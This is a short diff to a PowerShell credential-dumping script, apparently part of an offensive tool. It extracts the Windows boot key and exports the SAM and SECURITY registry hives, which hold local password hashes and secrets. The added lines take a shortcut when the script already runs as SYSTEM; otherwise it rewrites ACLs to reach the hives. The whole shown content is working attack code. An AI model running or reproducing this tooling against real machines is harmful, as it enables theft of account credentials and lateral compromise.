@@ -138,6 +138,15 @@ $hexValues = $bootKey | ForEach-Object { $_.ToString("x2") }
 $bootKeyString = $hexValues -join ""
 Write-Output "[*] Boot key is: $bootKeyString"
 
+$IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM"
+if ($IsSystem){
+	Export-RegistryKey -keyPath $samKeyPath -outputPath "C:\SAM.reg"
+	Export-RegistryKey -keyPath $securityKeyPath -outputPath "C:\SECURITY.reg"
+	Write-Output $ascii2
+	Exit
+}
+
+
 Create-ACL 'SAM\SAM'
 Export-RegistryKey -keyPath $samKeyPath -outputPath "C:\SAM.reg"
 Delete-ACL 'SAM\SAM'
@@ -147,6 +156,5 @@ Export-RegistryKey -keyPath $securityKeyPath -outputPath "C:\SECURITY.reg"
 Delete-ACL 'SECURITY'
 
 Write-Output $ascii2
-
 
 
